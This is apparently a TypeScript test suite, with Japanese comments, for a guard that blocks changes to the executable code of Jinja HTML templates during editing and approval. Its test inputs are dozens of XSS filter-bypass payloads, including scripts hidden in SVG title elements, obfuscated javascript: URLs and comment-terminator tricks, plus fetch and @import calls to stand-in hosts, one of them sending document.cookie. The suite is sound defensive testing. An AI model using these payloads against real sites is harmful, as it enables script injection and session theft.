// =============================================================================
// templateScripts.test.ts — テンプレ実行コード面の不変性(C0)
// =============================================================================
// テンプレの JS は正当なコンテンツで、除去してはならない。守るのは「生成時に確定した
// 実行コードが、編集・申請・承認・ペア転写のどの経路でも変わらない」ことだけである。
// よって本テストの重心は**迂回入力が拒否される**ことの主張に置き、正常系は「正当な編集を
// 誤って拒否しない」ことの回帰に絞る。承認者は実行結果しか見ないので、この照合が破れても
// 承認者は気づけない — ただし単独で承認の防壁になるわけではなく、承認画面の隔離
// (`sandbox="allow-scripts"`・same-origin なし)と対で初めて成立する。
import { isAppError } from '@editor/shared';
import { describe, expect, it } from 'vitest';
import {
  assertTemplateScriptsUnchanged,
  collectExecutableUnits,
  expandEncodedChips,
} from '../src/security/templateScripts.js';

const CTX = { templateId: 'AM01_510037_20240710_交付版', where: 'test' };

/** 不変性照合の結果を boolean で得る(AppError であることも同時に確かめる)。 */
function accepted(baseline: string, submitted: string): boolean {
  try {
    assertTemplateScriptsUnchanged(baseline, submitted, CTX);
    return true;
  } catch (e) {
    expect(isAppError(e)).toBe(true);
    return false;
  }
}

/** `data-opaque` の窓(base64 退避属性)へ任意バイト列を詰めた提出 HTML を作る。 */
const opaque = (payload: string): string =>
  `<span class="jinja-chip" data-opaque="${Buffer.from(payload, 'utf8').toString('base64')}"></span>`;

const BASE = '<html><body><script>col.width=1</script><p>本文</p></body></html>';

describe('assertTemplateScriptsUnchanged — 迂回入力の拒否', () => {
  it('実行コードが 1 文字も変わらなければ通る(唯一の正常系)', () => {
    expect(accepted(BASE, `${BASE.replace('<p>本文</p>', '<p>差し替えた本文</p>')}`)).toBe(true);
  });

  it('script を足したら拒否する', () => {
    expect(accepted(BASE, BASE.replace('</body>', '<script>fetch("/x")</script></body>'))).toBe(
      false,
    );
  });

  it('script の中身を書き換えたら拒否する', () => {
    expect(accepted(BASE, BASE.replace('col.width=1', 'col.width=1;fetch("/x")'))).toBe(false);
  });

  it('script を消しても拒否する(削除も変更である)', () => {
    expect(accepted(BASE, BASE.replace('<script>col.width=1</script>', ''))).toBe(false);
  });

  it('data-opaque の窓に script を隠しても拒否する', () => {
    // 下書き保存は requireAuth のみで任意ロールが書けるため、チップの中身は信用できない。
    // 復号した実体に対して照合していなければ、ここが素通りして承認まで到達する。
    expect(
      accepted(BASE, BASE.replace('<p>本文</p>', opaque('<script>fetch("/x")</script>'))),
    ).toBe(false);
  });

  it('基準側も復号して比較するので、同じ script をチップへ畳んだだけなら通る', () => {
    const chipped = BASE.replace(
      '<script>col.width=1</script>',
      opaque('<script>col.width=1</script>'),
    );
    expect(accepted(BASE, chipped)).toBe(true);
  });

  it('入れ子のチップに隠した script も拒否する', () => {
    const nested = opaque(opaque('<script>fetch("/x")</script>'));
    expect(accepted(BASE, BASE.replace('<p>本文</p>', nested))).toBe(false);
  });

  it('インライン event handler の追加を拒否する', () => {
    expect(accepted(BASE, BASE.replace('<p>', '<p onclick="fetch(\'/x\')">'))).toBe(false);
  });

  it('未知の on* 属性名でも拒否する(既知イベント名を数え上げない)', () => {
    expect(accepted(BASE, BASE.replace('<p>', '<p onbeforetoggle="fetch(\'/x\')">'))).toBe(false);
  });

  it('javascript: URL の追加を拒否する', () => {
    expect(accepted(BASE, BASE.replace('<p>本文</p>', '<a href="javascript:fetch(1)">x</a>'))).toBe(
      false,
    );
  });

  it('スキーム名に空白・制御文字を挟んだ javascript: も拒否する', () => {
    expect(
      accepted(BASE, BASE.replace('<p>本文</p>', '<a href="java\tscript:fetch(1)">x</a>')),
    ).toBe(false);
  });

  it('閉じタグを欠いた script も実行面として拾う', () => {
    expect(accepted(BASE, `${BASE}<script>fetch("/x")`)).toBe(false);
  });

  it('基準が空(確定も生成物も無い)なら実行コードは 1 つも持てない', () => {
    // fail-closed。基準の無い実行コードを承認へ通さない。
    expect(accepted('', '<p>本文</p>')).toBe(true);
    expect(accepted('', '<script>fetch("/x")</script>')).toBe(false);
  });

  it('script の並び順を入れ替えたら拒否する(集合ではなく順序込みで比較する)', () => {
    const two = '<script>a()</script><p>x</p><script>b()</script>';
    const swapped = '<script>b()</script><p>x</p><script>a()</script>';
    expect(accepted(two, swapped)).toBe(false);
  });
});

// 初版の抽出は script 要素 / `on*` 属性 / 生の `javascript:` の 3 形態だけを数えており、
// 以下はすべて baseline と完全一致して申請・承認の両入口を素通りした(実測)。
// 許可リスト方式へ反転した今、能動コンテンツの「別の言語機能」も単位として拾えていること。
describe('列挙型の抽出を素通りした迂回入力(回帰)', () => {
  const bypass = (injected: string): boolean =>
    accepted(BASE, BASE.replace('<p>本文</p>', injected));

  it('iframe srcdoc に実体参照で隠した script を拒否する', () => {
    expect(bypass('<iframe srcdoc="&lt;script&gt;fetch(1)&lt;/script&gt;"></iframe>')).toBe(false);
  });

  it('data:text/html を読み込む iframe を拒否する', () => {
    const doc = Buffer.from('<script>fetch(1)</script>', 'utf8').toString('base64');
    expect(bypass(`<iframe src="data:text/html;base64,${doc}"></iframe>`)).toBe(false);
  });

  it('data:text/html を読み込む object を拒否する', () => {
    expect(bypass('<object data="data:text/html,<script>fetch(1)</script>"></object>')).toBe(false);
  });

  it('&#58; で `:` を隠した javascript URL を拒否する', () => {
    expect(bypass('<a href="javascript&#58;fetch(1)">x</a>')).toBe(false);
  });

  it('SVG アニメーションで href を javascript: へ差し替える形を拒否する', () => {
    expect(bypass('<svg><animate attributeName="href" to="javascript&#58;alert(1)"/></svg>')).toBe(
      false,
    );
  });

  it('meta refresh による data:text/html への遷移を拒否する', () => {
    expect(
      bypass('<meta http-equiv="refresh" content="0;url=data:text/html,<script>x</script>">'),
    ).toBe(false);
  });

  it('style の @import による外部スタイル取り込みを拒否する', () => {
    expect(bypass('<style>@import url(https://evil.example/x.css);</style>')).toBe(false);
  });

  it('外部スタイルシートの link 追加を拒否する', () => {
    expect(bypass('<link rel="stylesheet" href="https://evil.example/x.css">')).toBe(false);
  });

  it('style 属性の url() で非画像スキームを引く形を拒否する', () => {
    expect(bypass('<div style="background:url(javascript:alert(1))">x</div>')).toBe(false);
  });

  it('タグ内 Jinja の差し替え(描画時に任意属性へ展開される)を拒否する', () => {
    const base = '<div {{ attrs }}>x</div>';
    expect(accepted(base, '<div {{ evil_attrs }}>x</div>')).toBe(false);
  });
});

// 過剰包含は「基準側にも同じだけ現れる」から誤検知にならない、が成り立つことの確認。
// ここが崩れると正当な保存が拒否され、運用側から検査ごと外される圧力になる。
describe('正当な編集を拒否しない(誤検知の回帰)', () => {
  const TPL = [
    '<!doctype html>',
    '<html lang="ja"><head><meta charset="utf-8" />',
    '<title>{{ fund.name }}</title>',
    '<link rel="stylesheet" href="css/{{ fund.code }}.css" />',
    '</head><body>',
    '<div class="page"><p class="notes">注記</p>',
    '<svg viewBox="0 0 100 50"><polyline points="0,0 10,10" stroke="#333" /></svg>',
    '<script>col.width=1</script>',
    '</body></html>',
  ].join('\n');

  it('本文・クラス・インラインスタイルの編集は通る', () => {
    const edited = TPL.replace(
      '<p class="notes">注記</p>',
      '<p class="notes lead" style="color:#333">書き直した注記</p>',
    );
    expect(accepted(TPL, edited)).toBe(true);
  });

  it('属性の並び順・引用符・自己終了スラッシュの揺れでは拒否しない', () => {
    const reserialized = TPL.replace(
      '<link rel="stylesheet" href="css/{{ fund.code }}.css" />',
      "<link href='css/{{ fund.code }}.css' rel='stylesheet'>",
    );
    expect(accepted(TPL, reserialized)).toBe(true);
  });
});

describe('collectExecutableUnits / expandEncodedChips', () => {
  it('退避属性は data-opaque 以外(data-jinja 系)も復号対象にする', () => {
    const html = `<span data-jinja="${Buffer.from('<script>x()</script>').toString('base64')}"></span>`;
    expect(expandEncodedChips(html)).toContain('<script>x()</script>');
    expect(collectExecutableUnits(html)).toHaveLength(1);
  });

  it('改行コードと前後空白の差は吸収するが中身は畳まない', () => {
    expect(collectExecutableUnits('  <script>a()</script>  ')).toEqual(
      collectExecutableUnits('<script>a()</script>'),
    );
    expect(collectExecutableUnits('<script>a( )</script>')).not.toEqual(
      collectExecutableUnits('<script>a()</script>'),
    );
  });
});

// R-再レビュー: raw text 要素の読み飛ばしが単位抽出ごと消していた穴。
// HTML の `<title>` が RCDATA なのは HTML 名前空間だけで、SVG の foreign content では
// 普通の外来要素。つまり `<svg><title><script>…` は実行されるのに単位ゼロで通っていた。
describe('raw text 読み飛ばしの迂回', () => {
  const svgBase = '<div><svg><title>zu</title></svg></div>';

  it('<svg><title> の内側に隐した script を拒否する', () => {
    const evil =
      '<div><svg><title><script>fetch("//x/"+document.cookie)</script></title></svg></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(svgBase, evil)).toBe(false);
  });

  it('<svg><title> の内側に隐した <style>@import を拒否する', () => {
    const evil = '<div><svg><title><style>@import url(http://evil/x)</style></title></svg></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(svgBase, evil)).toBe(false);
  });

  it('textarea の内側も同じく走査する', () => {
    const base = '<div><textarea>a</textarea></div>';
    const evil = '<div><textarea><script>x()</script></textarea></div>';
    expect(accepted(base, evil)).toBe(false);
  });
});

// CSS の URL 検出は `url(` を探す形だと `image-set("http://…")` で破れる。
// PDF 経路のゲート(`@editor/shared`)と同じ判定を共有していることを主張する。
describe('CSS の外部参照検出の共有', () => {
  const base = '<div><style>.a{color:red}</style></div>';

  it('image-set() の引用符文字列に置いた絶対 URL を拒否する', () => {
    const evil = '<div><style>.a{background-image:image-set("http://evil/x.png" 1x)}</style></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(base, evil)).toBe(false);
  });

  it('-webkit-image-set も同じく拒否する', () => {
    const evil =
      '<div><style>.a{background-image:-webkit-image-set("http://evil/x.png" 1x)}</style></div>';
    expect(accepted(base, evil)).toBe(false);
  });

  it('ページ番号のマージンボックスは単位を作らない(正当な CSS を拒らない)', () => {
    const css = '<div><style>@page{@bottom-center{content:counter(page)}}</style></div>';
    expect(collectExecutableUnits(css)).toEqual([]);
  });
});

// URL 属性の Jinja トークンで始まる値を無条件 inert にしていた穴。
// テンプレは描画されてから使われるので、描画後の href は `javascript:alert(1)` になる。
describe('Jinja トークンを前置した URL', () => {
  it('href="{{\'\'}}javascript:…" を拒否する', () => {
    const evil = `<a href="{{''}}javascript:alert(1)">x</a>`;
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted('<a href="/x">x</a>', evil)).toBe(false);
  });

  it('値全体が Jinja の普通の URL は単位を作らない(誤検知しない)', () => {
    expect(collectExecutableUnits('<a href="{{ fund.url }}">x</a>')).toEqual([]);
    expect(collectExecutableUnits('<img src="{{ logo }}/a.png">')).toEqual([]);
  });
});

// ── 走査器の終端規則 ──
// この走査器は手書きで、仕様準拠パーサではない。よって「終端の解釈がブラウザとずれる」
// 形が迂回路になる。ずれている間、単位列は基準と一致したまま実行面だけが増える。
describe('コメント終端 --!> の解釈', () => {
  it('<!-- a --!><script>…</script>--> に隠した script を拒否する', () => {
    // ブラウザは `--!>` でコメントを閉じるので、続く <script> は実行される。
    const evil = BASE.replace(
      '<p>本文</p>',
      '<p>本文</p><!-- a --!><script>fetch("/x")</script>-->',
    );
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(
      collectExecutableUnits(BASE).length,
    );
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('abrupt closing(<!-->)の後ろに置いた script も拒否する', () => {
    const evil = BASE.replace('<p>本文</p>', '<!--><script>fetch("/x")</script>');
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('閉じないコメントの中身も走査する(fail closed)', () => {
    const evil = `${BASE}<!-- <script>fetch("/x")</script>`;
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('普通のコメントは単位を作らない(誤検知しない)', () => {
    const ok = BASE.replace('<p>本文</p>', '<!-- 説明 --><p>本文</p>');
    expect(accepted(BASE, ok)).toBe(true);
  });
});

// ── タグ内 Jinja の読み飛ばし(仕様準拠パーサ化の評価で出た実測の迂回路)──
// 走査器は「タグ内に Jinja 断片があれば読み飛ばす」が、読み飛ばせないと判断したときに
// **入力の残り全部を捨てて**いた。単位列は基準と完全一致したまま、その後ろに任意の
// 実行面を足せる = 不変性ゲートそのものの迂回路である(申請・承認の両入口を通った)。
// ブラウザは `{` を普通の属性名文字として読み、タグを最初の `>` で閉じて後続を実行する。
describe('タグ内 Jinja で走査を打ち切らない', () => {
  const inject = (prefix: string): string =>
    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script></body></html>`;

  it.each([
    ['Jinja 開始ですらない `{`', '<div {>'],
    ['閉じない {{', '<div {{ x >'],
    ['閉じない {%', '<p {% for >'],
    ['閉じない {#', '<span {#>'],
  ])('%s を挟んで足した script を拒否する', (_label, prefix) => {
    const evil = inject(prefix);
    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('遠くの閉じ記号で script を丸ごと 1 断片に飲み込む形も拒否する', () => {
    // `}}` を文書の後ろへ置けば、その間の実行面が「タグ内 Jinja」として単位から消えていた。
    const evil = '<div {{ ><script>fetch("//evil/")</script>}}></div>';
    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
    expect(accepted('<div></div>', evil)).toBe(false);
  });

  it('正当なタグ内 Jinja は 1 単位のまま(`>` を含む式でも分割しない)', () => {
    expect(collectExecutableUnits('<td {% if a > b %}class="x"{% endif %}>a</td>')).toEqual([
      'jinja-attr:td|{% if a > b %}',
      'jinja-attr:td|{% endif %}',
    ]);
    expect(collectExecutableUnits('<div {{ d["k"] }}>x</div>')).toEqual([
      'jinja-attr:div|{{ d["k"] }}',
    ]);
  });
});

// ── 仕様準拠パーサ(parse5 等)へ置き換えないことの根拠(回帰ガード)──
// 検査対象は**描画前の Jinja テンプレ**であって HTML 文書ではない。ゆえに HTML 仕様どおりの
// 木構築は「別の成果物に対する正しさ」になる: 生の字面では raw text 要素やコメントに
// 包まれて見えるものが、Jinja 描画後には包みが消えて実行される。実測で parse5 は下の 3 形を
// すべて単位ゼロにした(= 素通り)のに対し、本走査器の過剰包含は拾う。ここが緑である限り
// 「木構築するパーサへ置き換える」は退行である。
describe('描画前テンプレ特有の隠し方(木構築パーサでは消える形)', () => {
  const inject = (prefix: string, suffix: string): string =>
    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script>${suffix}</body></html>`;

  it.each([
    [
      '条件付き textarea',
      '{% if false %}<textarea>{% endif %}',
      '{% if false %}</textarea>{% endif %}',
    ],
    ['条件付きコメント', '{% if false %}<!--{% endif %}', '{% if false %}-->{% endif %}'],
    ['条件付き title', '{% if false %}<title>{% endif %}', '{% if false %}</title>{% endif %}'],
  ])('%s で包んでも実行面として拾う', (_label, prefix, suffix) => {
    const evil = inject(prefix, suffix);
    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
    expect(accepted(BASE, evil)).toBe(false);
  });
});

describe('raw text の終了タグは直後の文字まで見る', () => {
  it('</scriptx> は終了タグではない(末尾のコードが単位へ入る)', () => {
    // JS エンジンは `init() < /scriptx>/ ; evil()` と読むので `evil()` が走る。
    const base = '<html><body><script>/*x*/init()</script></body></html>';
    const evil = '<html><body><script>/*x*/init()</scriptx>/;evil()</script></body></html>';
    expect(collectExecutableUnits(evil)).not.toEqual(collectExecutableUnits(base));
    expect(accepted(base, evil)).toBe(false);
  });

  it('</style-x> も終了タグではない(隠した @import を拾う)', () => {
    const base = '<div><style>.a{color:red}</style></div>';
    const evil = '<div><style>.a{color:red}</style-x>@import url(http://evil/x);</style></div>';
    expect(accepted(base, evil)).toBe(false);
  });

  it('大小文字・空白入りの正規の終了タグは従来どおり終端する(誤検知しない)', () => {
    const base = '<html><body><script>col.width=1</script></body></html>';
    const same = '<html><body><script>col.width=1</SCRIPT ></body></html>';
    expect(accepted(base, same)).toBe(true);
  });
});

// ── 走査器とブラウザの解釈がずれる形 ──
// 「読み飛ばした範囲は必ず単位化する」という不変則を、raw text 要素ごとに機械検証する。
// SVG の foreign content では raw text にならない、という事実は raw text 扱いする全要素へ
// 一様に効く。要素を足して単位化の分岐を書き忘れたらここが落ちる。
describe('raw text 要素の内側は必ず単位化される', () => {
  // 実 Chromium で onerror の発火を確認済みの形だけを並べる(単なる字面ではない)。
  const 実行される形 = {
    '<style=x> はタグ名が = で終端せず未知要素になる':
      '<style=x><img src=x onerror="evil()"></style=x>',
    '<svg><style> は foreign content で raw text にならない':
      '<svg><style><img src=x onerror="evil()"></style></svg>',
    '<svg><title> も同様': '<svg><title><img src=x onerror="evil()"></title></svg>',
    '<svg><textarea> も同様': '<svg><textarea><img src=x onerror="evil()"></textarea></svg>',
  };
  const base = '<html><body><h1>基準</h1></body></html>';
  for (const [label, payload] of Object.entries(実行される形)) {
    it(`${label} → 単位が増えるので拒否される`, () => {
      const evil = base.replace('</body>', `${payload}</body>`);
      expect(collectExecutableUnits(evil)).not.toEqual(collectExecutableUnits(base));
      expect(accepted(base, evil)).toBe(false);
    });
  }

  it('style の CSS 外部参照の単位化は従来どおり残っている(再走査で置き換えていない)', () => {
    const b = '<div><style>.a{color:red}</style></div>';
    const evil = '<div><style>@import url(http://evil/x);.a{color:red}</style></div>';
    expect(accepted(b, evil)).toBe(false);
  });

  it('CSS の宣言だけの編集は従来どおり通る(過剰包含が正当な操作を止めない)', () => {
    const b = '<div><style>.a{color:red;width:10px}</style></div>';
    const edited = '<div><style>.a{color:blue;width:20px}</style></div>';
    expect(accepted(b, edited)).toBe(true);
  });
});
